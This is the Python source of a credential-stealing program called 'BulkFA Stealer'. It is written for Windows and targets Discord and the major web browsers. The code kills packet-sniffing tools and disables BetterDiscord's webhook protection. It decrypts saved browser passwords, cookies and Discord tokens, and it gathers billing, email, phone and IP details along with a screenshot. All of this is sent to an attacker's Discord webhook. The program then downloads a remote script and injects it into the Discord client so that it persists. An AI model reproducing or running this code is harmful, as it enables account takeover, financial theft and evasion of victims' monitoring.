import os
from re import match
from json import loads, dumps
from base64 import b64decode
import re
import ntpath
from urllib.request import Request, urlopen
import json
from Crypto.Cipher import AES
from PIL import ImageGrab
from sys import argv
import win32crypt
import shutil
import sqlite3
import requests
import psutil
from dhooks import Webhook, File
import base64

webhook_url = "webhook_url"

try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class scare:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def crow():
            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
            return scare.fuck(names=forbidden)
    scare.crow()
except:
    pass

hook = Webhook(webhook_url)
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def bypass_better_discord():
    bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
    with open(bd, "rt", encoding="cp437") as f:
        content = f.read()
        content2 = content.replace("api/webhooks", "BulkFATheGoat")
    with open(bd, 'w'): pass
    with open(bd, "wt", encoding="cp437") as f:
        f.write(content2)
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url 
def get_uhq(token):
    s = ""
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) == 0:
        return None
    for i in response_dict:
        number = i['user']['public_flags']
        if i['type'] == 1 & number% 131072 != 0:
            s += f" <:DevBadge:912727453875699733>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 131072
        if i['type'] == 1 & number // 16384!= 0:
            s += f" <:TG_DiscordBugHunter:924608161116213278>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 16384
        if i['type'] == 1 & number // 512!= 0:
            s += f" <a:early:913099122968494170>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 512
        if i['type'] == 1 & number // 8!= 0:
            s += f" <:TP_Icon_bugHunter:896263053484638218>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 8
        if i['type'] == 1 & number // 4!= 0:
            s += f" <a:CH_IconHypesquadShiny:928551747591487548>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 4
        if i['type'] == 1 & number // 2!= 0:
            s += f" <a:Badge_partner:875020015215190046>|`{i['user']['username']}#{i['user']['discriminator']}`\n"
            number = number % 2
    if s == "":
        return "no hq friends"
    else:
        return s
def get_badges(token):
    user_data = getuserdata(token)
    s = ""
    isnitro = bool(user_data.get("premium_type"))
    if isnitro == True:
        nitrotype = user_data.get("premium_type")
        if nitrotype == 1:
            s+= " <:nitro:892130462024224838> "
        elif nitrotype == 2:
            s += " <:nitro:892130462024224838> "
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
    response_dict = json.loads(response.text)
    if response_dict['public_flags'] == 0:
        return "`No Badges`"
    number = response_dict['public_flags']
    if number // 131072 != 0:
        s += " <:DevBadge:912727453875699733> "
        number = number % 131072
    if number // 16384!= 0:
        s += " <:TG_DiscordBugHunter:924608161116213278> "
        number = number % 16384
    if number // 512!= 0:
        s += " <a:early:913099122968494170> "
        number = number % 512
    if number // 256!= 0:
        s += " <:balance:919973088651776001> "
        number = number % 256
    if number // 128!= 0:
        s += " <:brilliance:919973089285120111> "
        number = number % 128
    if number // 64!= 0:
        s += " <:bravery:919973089222205451> "
        number = number % 64
    if number // 8!= 0:
        s += " <:TP_Icon_bugHunter:896263053484638218> "
        number = number % 8
    if number // 4!= 0:
        s += " <a:CH_IconHypesquadShiny:928551747591487548> "
        number = number % 4
    if number // 2!= 0:
        s += " <a:Badge_partner:875020015215190046> "
        number = number % 2
    return s
def get_cc(token):
    k = ""
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) ==0:
        return "❌"
    else:
        k+= " 💳 "
    return k
def get_friends(token):
    s = 0
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) ==0:
        return None
    for i in response_dict:
        if i['type'] == 1:
            s+=1
    return s
appdata = os.getenv("localappdata")
baseurl = "https://discord.com/api/v9/users/@me"
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
tempfolder = os.getenv("temp")+"\\BulkFA"
encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
tokens = []
sep = os.sep
startup = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
chrome = appdata + "\\Google\\Chrome\\User Data\\"
def get_master_key(ptr):
     with open(ptr, "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]  # removing DPAPI
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key
def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"
def injector():
    for _dir in os.listdir(appdata):
        if 'discord' in _dir.lower():
            discord = appdata+sep+_dir
            disc_sep = discord+sep
            for __dir in os.listdir(os.path.abspath(discord)):
                if match(r'app-(\d*\.\d*)*', __dir):
                    app = os.path.abspath(disc_sep+__dir)
                    inj_path = app+'\\modules\\discord_desktop_core-1\\discord_desktop_core\\'
                    if os.path.exists(inj_path):
                        if startup not in argv[0]:
                            try:
                                os.makedirs(inj_path+'initiation', exist_ok=True)
                            except (FileExistsError, PermissionError):
                                pass
                        f = requests.get("https://raw.githubusercontent.com/otar120/injector/main/index.js").text.replace("%WEBHOOK%",webhook_url).replace("%IP%",f"{getip()}")
                        with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                            indexFile.write(f)
                        os.startfile(app + sep + _dir + '.exe')
                        hook.send("user got logged out")

def killDiscord():
    for proc in psutil.process_iter():
        if any(procstr in proc.name().lower() for procstr in
                ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

def checkToken(token):
        try:
            r = requests.get(
                url="https://discord.com/api/v9/users/@me",
                headers=getheaders(token),
                timeout=5.0
            )
        except:
            pass
        if r.status_code == 200 and token not in tokens:
            tokens.append(token)
paths = {
    'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': chrome + 'Default\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
    'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}
def t():
        for name, path in paths.items():
            if not ntpath.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if ntpath.exists(roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(encrypted_regex, line):
                                token = decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                                checkToken(token)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(regex, line):
                            checkToken(token)

        if ntpath.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(regex, line):
                            checkToken(token)
def main():
    t()
    embeds =[]
    for token in tokens:
        try:
            user_data = getuserdata(token)
            if not user_data:
                continue
            ip = getip()
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            card = get_cc(token)
            phone = user_data.get("phone")
            embed = {
                "color": 0x000000,
                "thumbnail": {
                    'url': "https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg"
                    },
                "fields": [
                    {
                        "name": f"<a:944007295417843743:959785231982931979> Token:",
                        "value": f'`{token}` [Click to copy](https://superfurrycdn.nl/copy/{token})',
                        "inline": False
                    },
                    {
                        "name": "<a:satanist:802503618972483615> Badges:",
                        "value": f"{get_badges(token)}",
                        "inline": True
                    },
                    {
                        "name": "<:944007233820307467:959785232037470208> Billing:",
                        "value": f"{card}",
                        "inline": True
                    },
                    {
                        "name": "<:944081229207175199:959785231999721472> Friends:",
                        "value": f"`{get_friends(token)}`",
                        "inline": True
                    },
                    {
                        "name": "<:944007233820307467:959785232037470208> Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": f"<a:satan:846706207632261120> IP:",
                        "value": f'`{ip}`',
                        "inline": True
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id}) - {phone}",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"BulkFA Stealer",
                }
            }
            embed1 = {
                "color": 0x000000,
                "description" : f'{get_uhq(token)}',
                "thumbnail": {
                    'url': "https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg"
                    },

                "author": {
                    "name": f"HQ Friends",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"BulkFA Stealer",
                }
            }
            embeds.append(embed)
            embeds.append(embed1)
        except:
            pass

    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "BulkFA Stealer",
        "avatar_url": "https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg",
        "file": ""
    }
    try:
        urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
    f.write("passwords:\n")
global user
user = os.environ.get("USERNAME")
chromePtr = r'C:\Users\\' + user + r'\AppData\Local\Google\Chrome\User Data\\'
firePtr = r"C:\Users\\" + user + "\\AppData\Roaming\Mozilla\Firefox\Profiles"
edgePtr = r'C:\Users\\' + user + r'\AppData\Local\Microsoft\Edge\User Data\\'
discPtr = r'C:\Users\\' + user + r'\AppData\Roaming\discord\\'
bravePtr = r'C:\Users\\' + user + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data'
operaPtr = r'C:\Users\\' + user + r'\AppData\Roaming\Opera Software\Opera Stable\User Data'


def locate(ptr):
    if ptr:
        for root, dirs, files in os.walk(ptr): # I want every Profile's cookies, just incase...
            for file in files:
                if file == 'cookies.sqlite': # Why the hell is FireFox special...
                    cookie_path = os.path.join(root,file)
                    parseFirefox(cookie_path)
                elif file == 'Cookies' and 'Edge' not in ptr:
                    cookie_path = os.path.join(root,file)
                    parseDB(cookie_path)
                elif file == 'Login Data':
                    pwd_path = os.path.join(root,file)
                    grabPwd(pwd_path)

def parseFirefox(cookie_path):
    con = sqlite3.connect(cookie_path)
    cur = con.cursor()
    for row in cur.execute('SELECT * FROM moz_cookies'):
        with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a") as f:
            f.write(str(row) + "\n")
    os.remove(r"C:\Users\\" + user + "\Desktop\info.txt")


def parseDB(cookie_path):
    master_key = ""
    if "Chrome" in cookie_path:
        master_key = get_master_key(findLocalState(chromePtr))
    if "Edge" in cookie_path:
        master_key = get_master_key(findLocalState(edgePtr))
    if "Brave" in cookie_path:
        master_key = get_master_key(findLocalState(bravePtr))
    if "Opera" in cookie_path:
        master_key = get_master_key(findLocalState(operaPtr))
    con = sqlite3.connect(cookie_path)
    cur = con.cursor()
    with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a", encoding="cp437", errors='ignore') as f:
        try:
            cur.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cur.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = decrypt_password(encrypted_cookie, master_key)
                if Host != "" and user != "" and decrypted_cookie != "":
                    f.write(f"HOST KEY: {Host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
        except:
            pass
    cur.close()

def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
     except Exception as e:
         return "Chrome < 80"

def grabPwd(pwd_path):
    if "Chrome" in pwd_path:
        master_key = get_master_key(findLocalState(chromePtr))
    if "Edge" in pwd_path:
        master_key = get_master_key(findLocalState(edgePtr))
    if "Brave" in pwd_path:
        master_key = get_master_key(findLocalState(bravePtr))
    login_db = pwd_path
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
                if url != "" and username != "" and decrypted_password !="":
                    f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
                    f.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


def findLocalState(ptr):
    for root,dirs,files in os.walk(ptr):
        for file in files:
            if file == 'Local State':
                path = os.path.join(root,file)
    return path

def start():
    try:
        locate(chromePtr)
    except:
        pass
    try:
        locate(edgePtr)
    except:
        pass
    try:
        locate(firePtr)
    except:
        pass
    try:
        locate(bravePtr)
    except:
        pass
    try:
        locate(operaPtr)
    except:
        pass

def send_info():
    f = open(f"{os.environ['USERPROFILE']}\Cookies.txt","r")
    s = f.read()
    k = ""
    if "coinbase" in s:
        k += "coinbase "
    if "binance" in s:
        k += "binance  "
    if "paypal" in s:
        k += "paypal  "
    passwords = File(f"{os.environ['USERPROFILE']}\Passwords.txt")
    cookies = File(f"{os.environ['USERPROFILE']}\Cookies.txt")
    screen =ImageGrab.grab()
    screen.save(f"{os.environ['USERPROFILE']}\Screenshot.jpg")
    image = File(f"{os.environ['USERPROFILE']}\Screenshot.jpg")
    hook.send("passwords:", file=passwords)
    hook.send(f"cookies: {k}", file=cookies)
    hook.send("screenshot:", file=image)

if __name__ == "__main__":
    try:
        if os.path.exists(os.getenv("appdata")+"\BetterDiscord"):
            bypass_better_discord()
    except:
        pass
    try:
        start()
    except:
        pass
    try:
        send_info()
    except:
        pass
    try:
        main()
    except:
        pass
    try:
        killDiscord()
    except:
        pass
    try:
        injector()
    except:
        pass
